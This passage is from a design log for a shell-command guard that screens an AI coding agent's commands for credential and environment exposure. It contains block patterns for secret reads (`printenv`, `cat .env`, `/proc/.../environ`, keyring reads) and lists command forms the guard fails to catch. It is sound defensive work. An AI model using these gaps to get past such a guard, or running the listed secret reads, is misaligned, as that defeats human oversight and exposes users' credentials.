  `ps aux` pass, and a dashed `-e` is every process. The two hosts differ where the guard has to read both. `-C` takes a command name on procps (`ps -C
  cmdlist`) and is a flag on macOS ("Change the way the CPU percentage is calculated": Apple `adv_cmds` `ps/ps.c` at
  60bc9ebf, `PS_ARGS` `aACcdeEfg:G:hjLlMmO:o:p:rSTt:U:u:vwx` and `case 'C': rawcpu = 1`). procps reads a dashless
  BSD-style word wherever it stands, macOS only as the first argument (`kludge_oldps_options` is applied to `argv[1]`
  only; a later word is a process id or an "illegal argument"). A command line is refused when either reading shows the
  environment: `ps -CE` and `ps -C -E` (macOS: `-E` is a flag), `ps -Ccat e` and `ps -fCcat e` (procps: `cat` is the
  command name and the BSD `e` shows the environment; on macOS `t` takes `e` as a tty), and `ps -CEmacs`, which is
  friction on procps (there `Emacs` is the command name; write `ps -C emacs`). Checked on this host (procps-ng 4.0.4):
  `ps -Cbash u` honours the BSD `u` after the glued command name, and `ps -fC bash u` reports conflicting format options
  (the `u` is a BSD option after `-C bash`). The guard reads no macOS legacy mode, where `-e` is read as `-E` (in
  `ps.c`, `case 'e'` falls through to `case 'E'` when `u03`, its `unix2003` compatibility flag, is off): it would refuse
  every `ps -ef`, so it stays a recorded gap. The dashless cluster test is a set-membership test (see the timeout item).
- **`systemctl show-environment` and a bare `systemctl show` are environment dumps.** `show-environment` prints a
  service manager's whole environment block, "the environment block that is passed to all processes the manager spawns"
  (`systemctl(1)` 255), and `show` with no unit prints the manager's own properties, `Environment=` among them, so
  every variable the session imported into that manager, a credential included, lands in the output. Both are blocked as
  a `service_manager_environment`, with or without `--user`, behind any options (the option table of
  `src/systemctl/systemctl.c` at v255 says which words are values: `-M host`, `-H user@host`, `-o json`), behind a
  launcher and inside a substitution; `show` passes when a unit is named or `-p` names other properties only. For one
  unit use `systemctl --user show -p Environment UNIT`; for the `PATH` a unit sees run a command in one:
  `systemd-run --user --pipe --wait --collect /bin/sh -c 'command -v node; echo "$PATH"'`. `systemctl --user cat`,
  `status` and `list-units` pass. Inside a keyring exec, behind a launcher the guard does not model (`watch`, `flock`),
  `systemctl` and the systemd launchers are read like the shells and `env` already are.
- **Launchers named by their path are the same launchers** (`/usr/bin/sudo systemctl show-environment`,
  `/usr/bin/timeout 5 printenv`): the wrapper walk compared the whole word.
- **A redirection between a launcher's hops is read wherever it stands (2026-09-29).** Bash removes a redirection from the
  argument list wherever it stands, so `env -u < "$PAPER_ENV_FILE" UNUSED cat` is `env -u UNUSED cat < "$PAPER_ENV_FILE"`.
  The launcher walk took the operator for the value of `-u`, `--unit`, `-n` and the like, dropped the segment that held the
  operand and let that string and `systemd-run --pipe --unit < "$PAPER_ENV_FILE" demo cat` through, both refused by the
  base guard (found by the independent verification review of 172596ed). Now each raw segment is read as written beside
  any walk; the walkers (`env`, `systemd-run` and its siblings, `sudo`, `nice`, `timeout`, `rtk`, a keyring exec) step
  over a redirection operator and its target wherever they look for an option, a value or the started command, so they
  never take one for a value; and an input redirection they stepped over is read with the command that gets it. For every
  launcher, every position between its hops and each of `<`, `<<<`, `2>`, `>`, `>>` and `&>`, the verdict is the one the
  same command gets with the redirection written last (684 combinations in the tests, none looser than the base guard; 166
  stricter, the operand of a `cat` that the base guard missed because it stood before the command, as in
  `env -u UNUSED < .env cat`). A number before an operator still ends the options of `sudo` and `nice`
  (`sudo 2>/dev/null -u root printenv`): the launcher walks take a number for a value, a recorded gap. Since 2026-09-30
  the base guard's own walk, which took an operator for the value of `sudo -u` or `env -u`, is read as well (see "No
  loosening"). A redirection is no argument of `set`, `export`, `declare` and `typeset` either: `set > FILE` and
  `set < FILE` still print every variable (`set a b` sets positional parameters), so they are an `environment_dump` now;
  the base guard passed them, and without this the redirection that a keyring exec's arguments carry to the command it
  starts would have made `exec name VAR < FILE -- set` pass, which the base guard refused (found by a grammar fuzz of
  600,000 launcher chains with redirections against the base guard, now 0 looser). A number is a redirection's
  descriptor there only when it touches the operator (2026-09-30, third verification review): bash reads `1>out` as a
  redirection of descriptor 1 and `1 > out` as the word `1` and a redirection, but shlex splits the two alike, so the
  tokenizer marks a number (or `{name}`) that touches `<` or `>` before it splits the text, and the dump rule counts only
  such a number as a descriptor. `set 1 > out` and `set 3 < input` set positional parameters and pass, as they did with
  the base guard (the round before this one refused them), while `set 1>out`, `set >out` and `set 2>/dev/null` print
  every variable and stay an `environment_dump`; the base guard passed those three. Descriptor metadata is part of
  every K4 segment/started-command deduplication identity, so positional `"0"` and descriptor `0` cannot collide.
  The original-text marker-byte exception remains: if a command contains the internal `\x01` marker, the conservative
  fallback may count separated numeric words as descriptors. `set 1 > out; echo \x01` therefore refuses, where
  `\x01` denotes the actual marker byte; plain `set 1 > out` allows and `set 1>out` refuses.
- **An internal error blocks; a timeout does not.** Only exit 2 blocks a PreToolUse call. `main()` now catches any
  exception from the rules (`RecursionError` and `MemoryError` included) and blocks with one line,
  `blocked (guard_error)`, that names no command text and prints no traceback. A hook that runs past its timeout is
  cancelled and the call goes ahead (Claude Code hooks documentation, "Timeouts", read 2026-09-29: "A timed-out
  `command`, `http`, or `mcp_tool` hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time
  the rules take is part of the guard's safety and no timer inside the hook can replace it. That is why the substitution
  scan reads each text in one pass (a stack of frames and a regular expression that jumps between the characters that
  matter, not a rescan per arithmetic shift or per nesting level), a chain of `env`, `rtk` or `systemd-run` launchers is
  walked by index instead of copying the rest of the command at every hop, and the bodies read behind double-quoted
  substitutions are capped at 32 levels and at four times the command's length plus 64 KiB.
  **Not every text rule was linear (corrected 2026-09-30).** An earlier version of this item said that every text is
  scanned in one pass; the third verification review found raw-text rules that run before any work budget and are
  quadratic on a repeated prefix: the `STORE_PATHS` patterns for `${XDG_CONFIG_HOME:-...}` and `${HF_HOME:-...}` and
  the `/proc/.../environ` path read the unbounded run after their literal again from every repeat (102,016 characters of
  `XDG_CONFIG_HOME:-` took 11.9 s, 54,000 of `HF_HOME:-` 13 to 14 s, 80,000 of `/proc` 13 to 15 s, and the real hook
  was killed at 10.5 s with no verdict), and a probe of every text rule found a fourth, `gh auth status ... -t`. Each is
  now a linear scan (`LinearScan` in the guard) that splits the text once into the runs the pattern cannot cross and
  searches each run for literals; old pattern against new scan, 7,229,043 generated texts a pattern (2,000,000 random
  and every text of up to six fragments) gave the same answer, and the tests keep 100,000 random texts a pattern. With
  the patterns linear, one unquoted word of 199,000 characters still cost 0.53 s in shlex, which copies the word at each
  character, so a text with no quote and no backslash is split without shlex (`SHLEX_PLAIN`: what shlex's state machine
  reduces to there, checked against shlex on 2,111,111 texts in both readings). A `find` read the prefix of each of its
  actions from a copy of the rest of the words (3.9 s on 49,000 `-ok`; 18,000 `-exec sudo` did not finish in 60 s);
  each action's prefix is walked by index now, each position once, and an action followed by an option word is not
  walked at all. Measured in-process on 2026-09-30 with the final guard: the review's four inputs take 0.01 to 0.07 s,
  the `find` input ending in a harmless command (which both readings read) 0.10 s, and every `STORE_PATHS` pattern's
  leading literal repeated to 199,000 characters at most 0.12 s, before a dump or a harmless command; the real hook
  answers the review's inputs in under a second (the tests bound these at 0.5 s of processor time and 1 s of wall
  clock, wider in CI). The prior reading (see "No loosening") copies the rest of the words
  at every `env`, `rtk` or keyring hop, as the base guard did, and spends the same budget: a chain that ends in a
  harmless command passes up to 1,410 bare `env` or 997 two-word hops (`rtk proxy`, `env FOO=1`) and is refused as
  `command_too_complex` beyond, in under 0.2 s at 20,000 hops (the base guard took 29 s and 56 s there).
  Measured on this host with the inputs of `PATHOLOGICAL` in `tests/test_secret_path_guard.py`: the first version of the
  substitution scan took 10 s on 12,000 here-documents and on 12,000 lines of `$((1 << 2))`, and ran past a minute on
  60,000 nested `systemd-run`; the launcher walk that predates this work took 29 s on 20,000 nested `env` and 56 s on
  20,000 nested `rtk proxy`. Each input now takes under a second (the test bounds it at 3 s). The dashless `ps` cluster
  test is a set-membership test since 2026-09-29: the regular expression before it had two overlapping quantifiers and
  took 13 to 15 s on `ps` followed by 70,000 `E` and a letter that is no flag (a hook past its timeout fails open), and a
  test now times every compiled pattern of the guard on 70,000-character repeats. Tokenizing is shlex's, about 9
  microseconds a character inside quotes, so from 2026-09-29 `main()` also refuses a command of more than 200,000
  characters as `command_too_large` (exit 2, one line that names no command text, with the hint to put the content in a
  file with the Write tool and pass the path): measured that day, one quoted word of 1,000,000 characters took 10.2 to
  13.0 s in `check()` (the base guard too), 600,000 took 3.8 to 4.4 s, 500,000 took 2.9 to 3.3 s and 200,000 took 0.6 s,
  and a hook that times out blocks nothing.
  **The size cap does not bound the work (2026-09-29).** The second verification review found a command of 9,645
  characters that took 13 s (a keyring exec whose started command holds 1,200 `python3` words: the analysis reads every
  suffix of them as a command, 5.8 million characters through shlex; the base guard took 2.1 to 2.8 s, the guard of
  50ca6ca2 12 to 13 s, and 5,000 words ran past 45 s) and one of 195,068 characters that took over 25 s (four-byte
  characters cost four times as much to tokenize, and five nested double-quoted substitutions read the text at every
  level; the reviewer's run passed 25 s without a verdict, here the base guard took 1.6 s and the guard of 50ca6ca2 15.7 to
  17.9 s). `check()` therefore reads a command inside one
  work budget per call (`WORK_LIMITS`): (a) the characters passed to shlex over every reading and nesting level, each
  counted at its storage width (1 byte for ASCII and Latin-1, 2 for the rest of the Basic Multilingual Plane, 4 beyond, as
  shlex costs 0.41, 0.85 and 1.70 s on 200,000 characters of one quoted word), at most 400,000; (b) the texts read (the
  command, each double-quoted substitution body, each `sh -c` or `eval` string, each keyring read), at most 10,000, the
  words of the segments that reading emits (a segment counts its words and one), at most 1,000,000, and the
  launched-command reads of the keyring analysis (the started command and each interpreter or launcher word inside it read
  again as a command), at most 500. The keyring analysis also drops identical segments before it reads them, scans the
  command once for each pattern instead of once for each started command, and tests the mentions of an injected variable
  against the starts of the `exec` arguments instead of against every span (3,500 keyring execs of one variable, each
  starting a distinct program, took 268 s before these changes, 4,000 distinct keyring execs 25 s).
  When a counter passes its limit `check()` raises `WorkBudgetExceeded`, not a reason, so no caller can take a command it
  could not read for one it allowed, and `main()` refuses it: exit 2, `blocked (command_too_complex)`, one line, no command
  text, the hint to split the command or put the content in a file with the Write tool. The two reviewer inputs are refused
  in 0.15 s and 0.04 s, as are their 600- and 5,000-word variants of the first (0.15 s each); a keyring exec with 60
  interpreter words stays inside the budget and reports its dump. Measured just under each limit, one counter at a time
  (the timing rows and `tests/test_secret_path_guard.py`): 398,000 characters of one quoted word and a `#` (two readings)
  1.1 s, 390,000 units of two-byte characters 0.9 s, 396,000 of four-byte 0.5 s, 9,900 texts 0.3 s, 1,000,000 words 0.2 s
  (40 keyring execs over a 20,000-word tail spend 1,005,859 in 0.18 s), 490 reads 0.03 s. 1,000 random mixes of 22
  adversarial building blocks at 199,000 characters took at most 0.91 s, and 64 shape families at 25,000 to 199,000
  characters at most 1.1 s (the shapes that grow faster than linearly are one long shlex token, which the
  200,000-character cap bounds at 0.5 s; since 2026-09-30 only a quoted one, see above). On 2026-09-30, with both
  readings, the same 1,000 mixes took about a second at most (0.93 to 1.07 s over runs at load averages of 7 to 23,
  this guard and the guard of 6c4f63d7 alike: the slowest mix is one quoted word of two-byte characters, which shlex
  still reads a character at a time), and the median mix 0.17 s (0.24 s before). Each figure is a run on a shared host: the same
  192,000-character quoted word took 0.8 s alone and 1.7 s at a load average of 8, so read a figure as within a factor of
  two. The largest real command of this repository, an 82,000-character script written through a here-document, spends
  34% of the characters, 1% of the words and texts and under 1% of the reads with both readings (measured 2026-09-30).
  An earlier version of this item said that no commit message comes near a limit; on 2026-09-30 the refs held 2,305
  distinct messages (a count that grows), and in the `git commit -m "$(cat <<'EOF' ...)"` pattern, where a message is
  read twice as a body, the largest (110,892 characters) needs 116% of the characters and two messages pass the budget
  and are refused as `command_too_complex`, as the guard of 6c4f63d7 refused them; `git commit -F FILE` passes them.
  Nothing in the fences and scripts comes near a limit. The friction is a command that needs more than that, measured
  as the largest size that still passes (2026-09-30, with both readings): a text whose characters, counted at their
  storage width and once for each reading (two when it holds a `#`), pass 400,000 (an ASCII script of 199,990 characters
  with a `#`, a two-byte text of 199,993 characters without one, a four-byte text of 99,993), more than 4,999 `sh -c`
  strings (9,999 before the prior reading, which reads each one again when the command passes this version's reading) or
  9,998 substitution bodies, more than 445 keyring execs nested in one another (40 in front of a 1,000-word tail), more
  than 250 keyring execs that each launch a program, more than about 300 interpreter words in a row after a keyring
  exec, more than about 380 distinct injected variables in a 10,000-character command, or a launcher chain longer than
  above. Write such content with the Write tool and pass the path. `check()` itself has no size limit, and a
  substitution nested beyond the caps above is still not read.
- **K3 acceptance history: no loosening against c26800f3 (2026-09-30).** These are K3 observations, before the
  single K4 form-F loosening below. An earlier round of this work loosened one rule on
  purpose, the value after a clustered value-taking `ps` option, and said that those `ps` forms were the only commands
  that the base guard refused and this guard passed. Both are withdrawn. The third verification review found that the
  loosening lets procps personalities through (see the `ps` item), and that the claim was false besides: the base guard
  refused `systemd-run --description kernel_keyring.py exec name X -- keyctl print 123` (`keyring_payload_read`) and
  `... -- cat .env` (`dotenv_read`), and this guard passed both, because its `systemd-run` walk took the keyring script for
  the value of `--description` and never unwrapped the keyring exec. (The strings run no reader: `systemd-run`'s command
  is then `exec`. The rule is the base guard's verdict, not whether a string leaks.) A probe of the class found more of it:
  the option values of `run0`, `systemd-cat` and `systemd-inhibit`, a path-qualified wrapper whose option value is the
  script (`/usr/bin/sudo -u kernel_keyring.py exec a B -- cat .env`), a `systemd-run` inside a keyring exec, and a
  redirection operator that the base guard's walk took for the value of `sudo -u`, `nice -n` or `env -u`
  (`sudo -u > printenv x`). Rather than find each walk that reads a word differently, `check()` now reads the words of
  every command twice: as this guard reads them and, when that reading allows the command, as the base guard read them
  (`prior_reading`: that guard's own walk and rules, spending from the same work budget), and refuses what either reading
  refuses; the `ps` rule applies the base guard's reading besides. No command the base guard refused passes, by
  construction, and each string above is a `BLOCKED` row with the base guard's reason. Measured in-process on 2026-09-30
  against the base guard's file (sha256 f9be81b2), with the final guard: the prior reading gives the base guard's verdict
  on every one of 460,910 commands (the test tables in 17 launcher prefixes and 6 suffixes, every fenced line of the
  repository, 19,296 launcher option-value commands in which each value-taking option of every launcher the guard walks
  or reads is followed by a reader, a keyring exec chain or a dump, in twelve spellings and glued, and ten seeded mutants
  of each of the 34,993 strings the base guard refuses), and `check()` loosens none of them. Nothing is loosened either by
  a differential over 88,207 commands (1,117 table and oracle rows in 11 launcher prefixes and 6 suffixes and in
  `bash -c`, `sh -c`, `eval` and substitutions, and the launcher option-value commands), the 806 fenced blocks, 4,454
  fenced lines and 202 scripts of this repository (written through a here-document and as one command), two fuzzers of
  60,000 random strings, eleven grammar fuzzes of 60,000 launcher chains or here-document placements and one of 100,000
  mixed, six seeds of a mutation fuzz (27,600 mutants of the 460 strings the base guard refuses, each), 478,915
  generated `ps` lines, the 40-consumer matrix of 115,200 commands, the 684 launcher redirection positions, the 2,518
  distinct commit messages of all refs in three patterns, and the hook run as a process on 42 inputs (the last round's
  26, three of them the `ps` forms refused again, and this round's). The 44 commands of that differential that both
  guards refuse for different reasons (this guard reads a credential file sourced in a substitution or behind
  `systemd-run` and says `environment_dump_after_source` where the base guard said `environment_dump`) get the same
  reasons from the guard of 6c4f63d7: none is new in this round. Of the 342 rows that this work adds to `BLOCKED` and
  `KEYRING_BLOCKED` (against the tables at c26800f3), 245 are refused only by this guard (the base guard passed them)
  and 97 are regression controls that the base guard already refused (the third review counted 240 and 67 before this
  round); the friction cases that review lists (a commit message, pull-request body, file text or Python here-document
  whose line reads as a dump or as the shell's `set`) stay documented friction, in the here-document item above.
- **Alternatives considered for reading shell syntax (2026-09-29).** A full shell parser was not adopted: the hook is one
  standard-library file that the profile installer copies verbatim to the host, and each candidate would have to be
  vendored per platform and started per call. `bashlex` 0.18 (PyPI 2023-01-18, GitHub last pushed 2024-04-08, GPL-3.0)
  is stale, `tree-sitter-bash` (pushed 2026-09-13, MIT) needs compiled bindings, and `mvdan/sh` (pushed 2026-09-28,
  BSD-3-Clause) is a Go binary. The hand-written reading is checked by a differential against the previous guard on
  generated commands and on this repository's own fences and scripts instead, and it stays a text heuristic.

What the guard does not read, each an inert string that `tests/test_secret_path_guard.py` records in
`EXPECTED_PASS_THROUGH` where it passes: a case pattern's `)` closes a `$(` (`echo "$(case x in x) printenv;; esac)"`),
bash 5.3's `${ command; }`, a backquote escaped inside a double-quoted wrapper string
(`bash -c "echo \"\`printenv\`\""`), a long option abbreviated to a unique prefix, which getopt_long accepts
(`systemd-run --mach host --pipe cat .env`, `--uni demo`), `systemd-run -p PassEnvironment=NAME` and words after the
started command, `run0 --setenv=NAME` (no secret name is read on a `run0` line), `machinectl shell .host /usr/bin/printenv`
and `busctl --user get-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager
Environment`, and a substitution nested beyond 32 levels or past the work budget (shlex's quote parity happens to expose
the innermost command of `"$(echo "$(...)")"` one level down, so the tests count the texts read instead). The other
way, the guard reads as commands what is not one: an array literal `x=(env -i A=b)`, a Python `set(...)` in a
here-document outside K4 form F, prose in a data here-document that looks like a command, and an `E`
after `ps -C` that is a command name (`ps -CEmacs`).

### K4: runner commands and bounded interpreter reading (2026-09-30)

K4 is based on `dc33b48acb906b9f2f10d1ca0f30fb0e23de877f`, whose guard is
SHA256 `a70a056fc27524c65ea5ce4db43fe712cabb44cf9b171866abf805d7306d3b51`.
It uses the existing guard's shell readers, the runner's parser and the repository's
behavioral tests. Syntax references are the [Bash redirection manual](https://www.gnu.org/software/bash/manual/html_node/Redirections.html),
[Python command-line reference](https://docs.python.org/3/using/cmdline.html),
[curl options](https://curl.se/docs/manpage.html), [Requests](https://requests.readthedocs.io/en/latest/api/),
[HTTPX](https://www.python-httpx.org/api/), [urllib.request](https://docs.python.org/3/library/urllib.request.html)
and [Node CLI](https://nodejs.org/api/cli.html). The gateway policy is source-reading evidence from
`diegosouzapw/OmniRoute@2f42a9ac1` (`v3.8.51`), especially
`src/server/authz/policies/management.ts`, `src/shared/utils/apiAuth.ts`,
`src/app/api/providers/client/route.ts`, `src/lib/db/providers/lazyConnectionView.ts`
and `src/app/api/settings/route.ts`; it is not a live management API observation.
All specimen strings in this subsection are inert guard inputs.

**Runner (RUN).** Every walked occurrence of `credential_run.py` with a first `--`
exposes its following command to the existing and K4 rules, including nested
keyring/runner starts and carried input redirections. Shell `-c` and `eval` text are
inspected before any unwrap. Environment dumps inside the runner refuse
`environment_dump_in_credential_run`, manager reads keep `service_manager_environment`,
and token-print forms keep `native_token_print`. A secret-name mention refuses
`secret_variable_reference` except the exact value-token position of a valid
`--only NAME` before that invocation's first `--`; `--only=NAME`, a mention after
`--` and raw secret expansion gain no exemption. Actual runner invocations (direct
or as a supported Python script operand) without `--`, `--check` or help, and
`get`/`print`/`list`/`token` forms, refuse `credential_run_usage`. The runner provides
no value-returning subcommand. RUN-START handles `uv run python`; RUN-USAGE through
uv remains a recorded limit. Available status does not make the runner the default.

**Gateway (GW): one matrix.** Covered HTTP targets are literal `http` requests to
`127.0.0.1`, `localhost`, `[::1]`, `10.0.2.2` or `host.docker.internal`, on ports
20128 and 20129 (the workstation's two gateways) and 21128 and 21129 (the new WSL
distribution's single-port gateway and its live-dashboard WebSocket, added on
2026-10-03 before that gateway holds accounts; wave-2 custody ruling, change 11).
21128 takes the rows of 20128; 21129 serves no management route, so no row names
it. Recognized scheme-less client targets use HTTP. Each covered
`/api/` request refuses `gateway_credential_route` unless the complete request
matches one row. The rows never override another guard rule.

| Effective method | Exact path | Ports | Query | Body condition |
| --- | --- | --- | --- | --- |
| GET | `/api/health` | 20128, 20129, 21128 | absent | — |
| GET | `/api/settings/compression` | 20128, 20129, 21128 | absent | — |
| GET | `/api/context/combos` | 20128, 20129, 21128 | absent | — |
| GET | `/api/model-capability-overrides` | 20128, 20129, 21128 | absent | — |
| GET | `/api/resilience` | 20128, 20129, 21128 | absent | — |
| GET | `/api/settings/feature-flags` | 20128, 20129, 21128 | absent | — |
| GET | `/api/cache` | 20128, 20129, 21128 | absent | — |
| GET | `/api/analytics/compression` | 20128, 20129, 21128 | absent or exactly `since=all` | — |
| GET | `/api/usage/call-logs` | 20128, 20129, 21128 | absent, or `limit`/`offset` below | — |
| GET | `/api/usage/call-logs/<id>` | 20128, 20129, 21128 | absent | — |
| GET | `/api/usage/provider-limits` | 20128, 21128 | absent | no body |
| POST | `/api/usage/provider-limits` | 20128, 21128 | absent | no body |
| POST | `/api/compression/preview` | 20129 only | absent | permitted |

`<id>` is one ASCII `[A-Za-z0-9-]{1,64}` segment. Collection call-log queries have
`limit=D` and/or `offset=D`, at most once each, in either order with one `&`, where
D is ASCII `[0-9]{1,5}`. Extra/duplicate parameters, empty values, a bare `?`,
child paths, fragments, userinfo, percent escapes and noncanonical/dynamic suffixes
do not acquire an exception. POST provider-limits performs a live quota-cache
synchronization; it is deliberately authorized with no body on 20128 and 21128. Preview
is 20129-only. Body absence is explicit: even an empty string, object or body-file
option is body-present; no file is opened to decide this.

Method and query evidence are associated with each request. Curl's last explicit
`-X` controls its wire method; otherwise data/form means POST, upload PUT and
`-I` HEAD. `-G` moves computable literal data into the query and changes the
implied method to GET (HEAD with `-I`); explicit `-X` still wins. Every URL in one
operation gets its options, including later options; `--next`/`-:` resets the
operation. Wget's explicit method/body and post options, requests/httpx literal
calls, urllib Request/urlopen data, Node fetch literal options and httpie/xh
method/data/query fields follow their client syntax. Node fetch body alone does
not change GET. Missing/ambiguous method, query, body or grouping evidence on a
visible management request refuses. Ordinary transport/output option operands
are consumed, not mistaken for URLs. Config files, hidden runtime URL construction
and arbitrary clients are not an HTTP firewall: plain URL mentions in non-client
commands pass this rule, while visible unresolved requests in interpreter code
refuse. Every actual `omniroute api` or `omniroute sync` invocation, including help
and forms after global options, refuses; the CLI has no HTTP-matrix exception.

**Manager, store, selectors and canary.** `manager_environment_write` refuses
whole-manager imports, imports/assignments of secret names and
`dbus-update-activation-environment --all` or secret operands when B allowed
the text. Short secret-name forms, including a non-secret variable whose value
names a secret, retain B's `secret_variable_reference` reason. Non-secret named
imports and `unset-environment` remain unaffected. Sources are systemd v255
`src/systemctl/systemctl-set-environment.c` and D-Bus 1.14.10's
`dbus-update-activation-environment(1)`.

`keyring_store_literal` refuses an extra value argument to `kernel_keyring.py store`,
any feeding here-document, a literal here-string, and an immediately preceding
echo/printf pipeline with literal input. Producer redirections and nonempty
literal assignments in the same scanned command also count. Quote provenance
matters: single-quoted, ANSI-C-quoted or escaped `$` is literal; an active expansion is dynamic
unless the same command gives it a literal value. Without such an assignment,
`printf '%s\n' "$K"` or a hidden `read -rs` feed remains allowed when other rules
pass. Use the hidden prompt; never put a key literal in the command text.

`ps_personality_selector` refuses actual ps commands when the text supplies
`PS_PERSONALITY`, `CMD_ENV` or `I_WANT_A_BROKEN_PS` by prefix/env assignment or an
earlier export/declare. The marker follows nested/started commands in that text;
normal `ps -e`, `ps -ef` and quoted mentions remain allowed. Inherited selectors
from an earlier session are invisible to this pure text check.

`canary_user_terminal_required` refuses an actual `canary_proof.py` invocation
with `--user-run` (also equals spelling) or `--phase comparison`/`--phase=comparison`,
even after `--`, including supported Python/launcher/uv and literal shell-wrapper
forms. A canary comparison belongs in the operator's user terminal; a pty alone
is not authorization. Baseline/final/help without these triggers and echo mentions
remain unaffected. This predicate comes from the frozen canary contract,
SHA256 `9d4c8e555966d4cf50518be28b6ec55500f1987883e936319e5551401a82c0af`,
not a canary execution in K4.

**Names and trees.** `CLAUDE_CODE_OAUTH_TOKEN` and `CLAUDE_CODE_MESSAGING_TOKEN`
join the secret-name expansion, lookup, search, runner and manager checks. The
inventory's optional `claude-oauth-token` entry is distinct from native sign-in;
its headless token is injected per command and stays out of the standing shell
environment. Protecting the messaging name does not put it in that inventory
entry. Readers, copies and searches of both complete
`~/.local/share/omniroute` and `~/.local/share/omniroute-fw` trees, including roots,
`db_backups/` and `services/`, refuse `credential_file_read`, subject to base
precedence. Home spellings and literal `$XDG_DATA_HOME/omniroute[-fw]` are recognized
with a directory boundary. The settings template adds each tree's `Read(~/...)`
and `Read(**/...)` pair; K4 makes no host installation.

**The single loosening, form F.** Against dc33b48a, only an exact top-level
Python/Node interpreter here-document can replace the body's shell reading in
both base readings. Count every occurrence of `<<` in the original entire text,
including body/quoted occurrences and overlapping positions; there must be
exactly one. The first LF-delimited line is the complete operator line, with no
CR or preceding blank/comment line. Its grammar is below. The first following
line exactly equal to IDENT is the terminator, independent of language quote
state; the command ends there or after its one final LF. No later whitespace,
blank line, comment or command is allowed. A nonempty tail requires at least one
space/tab after the delimiter's closing quote; no touching digit or redirection
can become a suffix of the delimiter word.

BL is ASCII space/tab; identifiers and digits are ASCII; quoted terminals are
literal syntax. ARG is a nonempty shell word assembled from the listed pieces.

```text
OL      := BL* [ "cd" BL+ ARG BL* "&&" BL* ] INTERP BL* "<<" BL* QIDENT [ BL+ TAIL ] BL*
QIDENT  := "'" IDENT "'" | '"' IDENT '"'
IDENT   := [A-Za-z_][A-Za-z0-9_]*
NAME    := [A-Za-z_][A-Za-z0-9_]*
ARG     := (PLAIN | SQ | DQ)+
PLAIN   := one [A-Za-z0-9_./:=,+@%~-] | "$" NAME | "${" NAME "}"
SQ      := "'" [^'\r\n]* "'"
DQ      := '"' ( [^"$`\\!\r\n] | "$" NAME | "${" NAME "}" )* '"'
PATHP   := [A-Za-z0-9_.~/-]* "/"
PYNAME  := "python" | "python3" | "python" DIGITS "." DIGITS | "pypy" | "pypy3"
PY      := PATHP? PYNAME ( BL+ "-" [BbdEIOPqsSuv]+ )* [ BL+ "-" ( BL+ ARG )* ]
JS      := PATHP? ( "node" | "nodejs" )
           [ BL+ "--input-type=" ( "module" | "commonjs" ) ] [ BL+ "-" ( BL+ ARG )* ]
INTERP  := PY | JS
REDIR   := ( "1" | "2" | "&" )? ( ">" | ">>" ) BL* ARG
           | "2>&1" | "1>&2" | ">&2"
FILTER  := ( "head" | "tail" ) ( BL+ ( "-n" BL+ DIGITS | "-" DIGITS | "-c" BL+ DIGITS | "-q" ) )*
           | "wc" ( BL+ ( "-l" | "-c" | "-w" | "-m" ) )*
           | "sort" ( BL+ ( "-n" | "-r" | "-u" | "-h" | "-V" ) )*
           | "uniq" ( BL+ ( "-c" | "-d" | "-u" ) )*
           | "grep" ( BL+ "-" [inEFvwxco]+ )* BL+ ARG
TAIL    := REDIR ( BL* REDIR )* ( BL* "|" BL* FILTER )*
           | "|" BL* FILTER ( BL* "|" BL* FILTER )*
```

The interpreter reads stdin, with explicit `-` or no script operand. Only the
optional cd prefix is admitted: assignments/launchers, `-c`/`-m`, script operands,
unsupported options/languages, input redirections, other pipe programs,
`;`/`&&`/`||` after the operator, `<<-`, unquoted/backslash/ANSI-C delimiters,
a second `<<`, a missing terminator and trailing text are outside F. There is no
data/prose exemption. Whole-text raw paths/names/keyring-code protections and
operator-line checks remain; only the body is empty in the base word-reading
input, whose `texts` tuple is `(masked, unquoted(masked))`. Base evaluation is
eager and shares the budget; its exhaustion propagates. CODE scans the body.

The strings below use `\n` for LF and are data, not shell examples to execute.

| Boundary string | K4 verdict |
| --- | --- |
| `python3 - <<'PY'\n# unique values\nprint(len(set([1, 1])))\nPY` | ALLOW; benign set() in F |
| `python3 - <<PY\nprint(set([1]))\nPY` | `environment_dump`; unquoted delimiter is outside F |
| `python3 - <<'PY' 2>/dev/null\nprint(set([1]))\nPY` | ALLOW; separated output redirection |
| `python3 - <<'PY'2>/dev/null\nPY2\nprintenv\nPY` | `environment_dump`; delimiter-suffix blocker |
| `node - <<'JS' 1>/dev/null\nconst env = {PATH: '/usr/bin'}; console.log(env)\nJS` | ALLOW; separated output redirection |
| `node - <<'JS'1>/dev/null\nJS1\nprintenv\nJS` | `environment_dump`; delimiter-suffix blocker |
| `cat <<'EOF' > note.md\nprintenv\nEOF` | `environment_dump`; data body keeps B |

**Interpreter checks and tails.** CODE regions extend from each interpreter
here-document operator line to its first exact terminator (or end of text if
missing), whether or not F qualifies. Multiple regions never authorize F.
Language comments, literals and executable f-string/template interpolations are
scanned separately. SHELL-LITERAL reads standalone literals, double-quoted shell
substitutions, multiline literals and JS template chunks conservatively as shell
text. SHELL-OUT reads literal leading commands/argv passed to recognized process
calls in here-document code, with quote-safe argument joining and every guard
rule. Indirect/computed calls remain bounded residuals.

WHOLE-ENV refuses recognized environment output/serialization at any nesting
depth and enumeration as `environment_dump`. Exact non-secret single-key lookups
and bounded local copies used only for non-secret environment preparation may
pass; secret keys keep the existing protections. Whole-environment interpolation
is output, while exact non-secret single-key interpolation is safe for this rule.
Any remaining visible environment access, including unresolved reflective access,
refuses `interpreter_environment_unclassified`; it is not a residual ALLOW.
INLINE-ENV applies that same language/comment/interpolation classifier to Python
`-c` (including supported clusters/attached forms) and Node `-e`/`--eval`, through
supported launchers and started commands. It stops at script/stdin operands or
`--`; it does not newly apply SHELL-LITERAL/SHELL-OUT to inline code.

TAIL-READ independently reads text after an exact quoted-identifier terminator
under the original budget, even for a simple data header. Language quote state
cannot hide a real terminator. This is a tightening only: a valid F has no tail,
and a data-body tail scan never masks that body or creates another exception.

**Precedence, descriptor identity and work.** Outside F, every dc33b48a refusal
and its reason wins over new findings. Inside F, amendment A5 defines B using
the masked body, so only raw and operator-line base refusals take precedence.
A reason produced solely by reading the original body as shell can be replaced
by its CODE reason. In the measured differential, six form-F variants of
`env = os.environ.copy()` followed by `unknown(env)` change from
`environment_dump` to `interpreter_environment_unclassified`. Those are A5
reason transitions, separate from refusal-to-ALLOW loosenings. For base-allowed
text, K4 orders names/stores, runner
keyring-equivalent checks and shell-inline-before-unwrap, runner usage/mentions,
gateway, manager writes, store literals, ps selectors, canary, interpreter
